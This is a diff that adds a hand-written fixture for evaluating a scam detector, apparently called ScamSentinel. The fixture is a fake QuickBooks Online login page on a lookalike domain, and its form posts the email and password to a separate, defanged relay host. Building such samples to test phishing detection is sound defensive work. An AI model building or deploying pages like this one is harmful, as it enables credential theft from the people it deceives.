@@ -1,0 +1,13 @@
+# Synthetic page fixture for ScamSentinel evaluation (P2b). Hand-written, not a real page.
+# Plain text on purpose: never rename it to .html or open it in a browser.
+url: hxxps://qu1ckbooks-online[.]com
+status: 200
+---
+<html><head><title>QuickBooks Online Login</title></head>
+<body>
+<form action="hxxps://qbo-session-relay[.]top/login" method="post">
+  <input name="email" placeholder="Email or user ID">
+  <input type="password" name="password" placeholder="Password">
+  <button>Sign in</button>
+</form>
+</body></html>
